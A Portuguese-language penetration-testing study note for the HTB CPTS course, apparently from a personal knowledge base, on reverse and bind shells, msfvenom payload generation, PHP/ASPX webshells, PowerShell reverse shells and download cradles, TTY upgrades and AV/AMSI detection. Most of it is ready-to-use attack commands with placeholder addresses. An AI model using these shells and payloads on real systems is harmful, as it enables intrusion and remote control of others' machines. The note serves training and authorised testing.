---
tema: Shells e Payloads
tópico: Reverse/bind shell, staged vs stageless, msfvenom, webshells, upgrade de TTY
tags: [htb, cpts, shell, payload, msfvenom, reverse-shell, webshell, tty, meterpreter, amsi]
dificuldade: medium
---

# 🐚 CPTS 08 — Shells and Payloads

> [!info] Objetivo
> Escolher o shell certo para a situação (bind ou reverse, staged ou stageless), gerar o payload com `msfvenom`, entregar, receber no listener e **estabilizar o TTY**. Fecha com uma nota curta sobre AV/AMSI para não cair em detecção gratuita.

---

## 🎯 Quando usar

| Situação | Escolha |
|----------|---------|
| Alvo tem egress, você está atrás de NAT | **Reverse shell** (o padrão 95% das vezes) |
| Alvo não tem egress, mas você alcança a porta dele | **Bind shell** |
| Precisa de estabilidade, upload/download, pivô | **Meterpreter** (staged ou stageless) |
| Só há webserver e execução de arquivo | **Webshell** |
| Ambiente Windows hardened, quer fileless | Payload PowerShell em memória |
| Exploit precisa de um "stage" pequeno | Staged payload |

---

## 🔁 Bind vs Reverse

| Aspecto | Bind | Reverse |
|---------|------|---------|
| Quem escuta | O alvo | Você |
| Direção | Você → alvo | Alvo → você |
| Fura NAT/firewall de saída | Não | Sim |
| Falha típica | Firewall de entrada do alvo | Egress bloqueado / AV no payload |
| Requer IP acessível | Sim (alvo alcança você) | Sim (você alcança o alvo) |

```bash
# Reverse: listener PRIMEIRO, payload depois
nc -lvnp 443
# No alvo (Linux):
bash -i >& /dev/tcp/<IP>/443 0>&1
```

```bash
# Bind: payload abre a porta no alvo, você conecta depois
# No alvo (Linux):
nc -lvnp 4444 -e /bin/bash
# Do atacante:
nc <IP> 4444
```

---

## 📦 Staged vs Stageless

| Aspecto | Staged | Stageless |
|---------|--------|-----------|
| Nome (MSF) | `.../meterpreter/reverse_tcp` | `.../meterpreter_reverse_tcp` |
| Como funciona | Envia "stage 0" pequeno → baixa o resto | Payload inteiro de uma vez |
| Tamanho | Pequeno (cabe em buffer de exploit) | Grande |
| Estabilidade | Depende de 2ª conexão dar certo | Mais confiável na rede |
| Handler | `exploit/multi/handler` com o mesmo payload | Idem |

**Regra:** exploit com buffer apertado → staged. Rede instável/hardened → stageless.

---

## 🧰 Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| `msfvenom` | Gerar payload em dezenas de formatos |
| `nc` / `rlwrap nc` | Listener simples com histórico |
| `socat` | PTY real, shell interativo de verdade |
| `msfconsole` `multi/handler` | Receber qualquer payload MSF |
| `python3 -m http.server` | Entregar payload |
| `webshells` do SecLists | PHP/ASPX/JSP prontos |

```bash
# Listener simples, mas com readline/histórico (muito melhor que nc puro)
rlwrap nc -lvnp 4444
```

---

## 💣 msfvenom

```bash
# Windows: reverse shell de shell simples (64 bits)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe

# Windows: meterpreter staged com encoder (encoders x86 para x86 payloads)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 \
  -e x86/shikata_ga_nai -i 5 -f exe -o met.exe

# Windows x64: encoder aplicável a x64
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 \
  -e x64/xor_dynamic -i 3 -f exe -o met64.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf -o shell.elf

# PHP, ASPX e WAR (webshell/app server)
msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw -o shell.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war -o shell.war
```

| Flag | O que faz |
|------|-----------|
| `-p` | Payload (`msfvenom -l payloads` para listar) |
| `-f` | Formato de saída (`-l formats`) |
| `-a` / `--platform` | Arquitetura / plataforma alvo |
| `-e` / `-i` | Encoder e nº de iterações |
| `-b '\x00\x0a'` | Remove bad chars do payload |
| `-o` | Arquivo de saída |
| `--encrypt` | Criptografia do payload (formato `msf`) |

---

## 🕸️ Webshells

```php
<!-- PHP minimalista: executa comando via GET -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

```aspx
<%-- ASPX: executa via cmd.exe --%>
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
```

```bash
# Webshells prontos no SecLists
ls /usr/share/seclists/Web-Shells/            # PHP, ASPX, JSP, CFM, FuzzDB
# Uso: http://<URL>/shell.php?cmd=id
```

**Defesa que você vai encontrar:** webshell só importa se o filtro de upload deixar passar. Ver [[CPTS 21 - File Upload Attacks]].

---

## 🪟 PowerShell reverse e ConPTY

```powershell
# Reverse shell PowerShell puro (funciona sem binário externo)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<IP>',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

```powershell
# Shell totalmente interativa (ConPTY) — resolve Ctrl+C, cores e TUIs
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell <IP> 9001
```

```bash
# Listener para os dois casos
nc -lvnp 9001        # (ou rlwrap nc -lvnp 9001)
```

---

## 🖥️ Upgrade de TTY (Linux)

```bash
# 1) Shell cru -> shell com PTY usando Python presente no alvo
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (se só houver python2: python -c 'import pty; pty.spawn("/bin/bash")')

# 2) Ctrl+Z (suspende), no SEU terminal:
stty raw -echo; fg
# 3) Ajusta tamanho e variáveis dentro da shell
export TERM=xterm-256color
stty rows 50 cols 200
# 4) Se o terminal ficar embolado:
reset
```

```bash
# Atalho quando `script` existe no alvo: já entrega PTY
script -q /dev/null -c bash
```

```bash
# socat: PTY real com echo/tty corretos (o melhor quando disponível)
# Atacante:
socat file:$(tty),raw,echo=0 tcp-listen:4444
# Alvo Linux:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
```

---

## 🎣 Handler e entrega

```bash
# Handler multi/handler: recebe qualquer payload MSF
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/shell_reverse_tcp
msf6 > set LHOST <IP>
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j -z          # -j = em background, -z = não interagir
```

| Entrega | Como |
|---------|------|
| HTTP | `python3 -m http.server 8000` + `curl`/`IWR`/`certutil` |
| SMB | `smbserver.py share . -smb2support` |
| Download cradle | `IEX(New-Object Net.WebClient).DownloadString(...)` |
| Macro/VBA | Documento com `AutoOpen` chamando o cradle |
| Serviço/agendador | `sc create`, `schtasks /create` (pós-acesso) |

Detalhe de cada canal: [[CPTS 07 - File Transfers]].

---

## 🛡️ AV/AMSI (nota curta)

- **AMSI** inspeciona conteúdo de script na memória (PowerShell, VBS, JScript) — não é só arquivo em disco.
- **EDR** observa criação de processo, injeção, `CreateRemoteThread`, hooks em `amsi.dll`.
- Práticas que reduzem detecção **sem** virar bypass: usar binários assinados (LOLBins), evitar strings em claro, evitar execução óbvia, entregar em memória, versionar caracteres.
- Encoder do `msfvenom` **não é bypass de AV** — é ofuscação básica. Trate como cosmético.
- Preenchimento/detecção é o real limitante: em engajamento, combine com o time de defesa e registre o que foi testado.

---

## ⚠️ Pegadinhas

- **Listener antes do payload** — se o alvo não tem retry, a conexão se perde para sempre.
- Porta escolhida precisa sobreviver ao firewall de egress (teste 80/443/53 também).
- `shikata_ga_nai` só é x86; aplicá-lo em payload x64 gera payload quebrado.
- Payload `php/reverse_php` exige PHP com `proc_open` habilitado; muitas vezes o webshell `system()` puro funciona melhor.
- Shell sem PTY quebra `su`, `sudo`, `ssh`, editores e `Ctrl+C` — sempre faça upgrade.
- `Ctrl+Z` sem `stty raw -echo` deixa o terminal em modo canônico: comandos ecoam e enter some.
- Staged payload sem handler compatível = "conexão que abre e fecha" infinitamente.
- Meterpreter precisa que o handler use **o mesmo** payload do binário.

## ✅ Checklist rápido

- [ ] Direção decidida (reverse/bind) e listener de pé
- [ ] Staged vs stageless coerente com o exploit
- [ ] Plataforma/arquitetura do payload conferidas (`x64`!)
- [ ] Payload entregue e integridade confirmada
- [ ] Handler com `ExitOnSession false`
- [ ] TTY estabilizado (pty.spawn/socat) + `TERM`/`stty`
- [ ] Nota de OPSEC: artefatos, nome do processo, histórico

## 🔗 Relacionado

- [[CPTS 07 - File Transfers]]
- [[CPTS 09 - Using the Metasploit Framework]]
- [[CPTS 21 - File Upload Attacks]]
- [[Fase 07 - Shells e Transferência de Arquivos]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
